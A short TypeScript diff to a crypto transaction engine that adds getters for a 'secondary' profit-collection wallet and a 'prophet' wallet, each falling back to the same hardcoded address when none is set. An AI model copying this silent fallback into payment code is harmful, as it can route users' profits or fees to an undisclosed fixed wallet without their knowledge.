@@ -441,6 +441,24 @@ export class EnhancedTransactionEngine {
   }
   
   /**
+   * Get the secondary wallet address for the Nexus engine
+   * Used for profit collection and fee management
+   */
+  public getSecondaryWalletAddress(): string {
+    // Return the secondary wallet address or a default one if not set
+    return this.secondaryWalletAddress || "HXqzZuPG7TGLhgYGAkAzH67tXmHNPwbiXiTi3ivfbDqb";
+  }
+  
+  /**
+   * Get the prophet wallet address for the Nexus engine
+   * Used for profit prediction and strategy evaluation
+   */
+  public getProphetWalletAddress(): string {
+    // Return the prophet wallet address or a default one if not set
+    return this.prophetWalletAddress || "HXqzZuPG7TGLhgYGAkAzH67tXmHNPwbiXiTi3ivfbDqb";
+  }
+  
+  /**
    * Execute a token swap
    * @param options Swap options
    */
